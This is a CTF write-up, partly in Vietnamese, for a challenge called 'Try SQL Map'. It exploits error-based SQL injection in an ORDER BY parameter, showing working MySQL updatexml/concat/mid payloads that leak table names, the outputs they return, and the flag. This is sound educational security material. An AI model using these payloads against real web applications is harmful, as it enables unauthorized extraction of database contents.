# KMA CTF - Try SQL Map

**hints**: The length of flag table name > 32 characters

## PHÂN TÍCH
Như tên bài , thì đây là bài SQLi ở lệnh ORDER BY: `http://try-sqlmap.ctf.actvn.edu.vn/?order=id`

Câu truy vấn có thể sẽ như sau:

```
SELECT column_name from table_name order by $_GET[order]
```

`Quick sqlmap` --> sql injection `error based`!

**Payload**:
```
updatexml(0,concat(0xa,(select table_name from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
flahga123456789xxsxx012xxxxxxxx'
```

Because of the length, we use mid function in MySQL to cut the rest of flag that are not fully obtain.

```
updatexml(0,concat(0xa,(select mid(table_name,20,25) from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
x012xxxxxxxxx34567xx1'
```

Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`, we got the table name.

Same with column and flag using column_name from information_schema.tables --> select column_name from flahga123456789xxsxx012xxxxxxxxx34567xx1....

**flag**: `KMACTF{X_Ooooooooooooorder_By_Noooooooooooooooooooone_SQLMaaaaaaaaaaaap?!!!!!!!!!!!!}`

**Góc than thở**:
```html
Mình chỉ cặm cụi với extractvalue(), mặc dù nó không sai nhưng chỉ biết thay đổi main query mà không thay đổi cấu trúc syntax toàn câu lệnh. Mặc dù đây là error based nhưng không có nghĩa nó sẽ trả về error của error mà chỉ là kết quả lệnh đó, nếu không sẽ chỉ trả về NULL. Mình cần stick với challenge lâu hơn và thử tất cả, điều chỉnh tỉ mỉ từng query cho đến khi bế tắc thay vì nhảy cóc và 'cho rằng' nên không thử. 

Hàm extractvalue ở payload all the things nó dùng random() để gây lỗi, nhưng ta chỉ cần số 0 là có thể gây lỗi rồi trong khi random có thể  bị block hay raise error, phải try everything. Haiz!!

Vì khi error/không có gì nó sẽ trả về NULL, nhưng thật ra là do khi mình query information_schema.tables nó sẽ trả về nhiều column lẫn rows nên gây ra lỗi trong khi trigger như select 'devme' lại không, do đó mình luôn cần dùng concat/group_concat cho đến limit/offset. Blind error nhưng không biết detect error thì không xứng đáng được flag. Đừng tự tin là mình đã biết mà cần tự tin là mình đã chai và nhàm các dạng này.
```
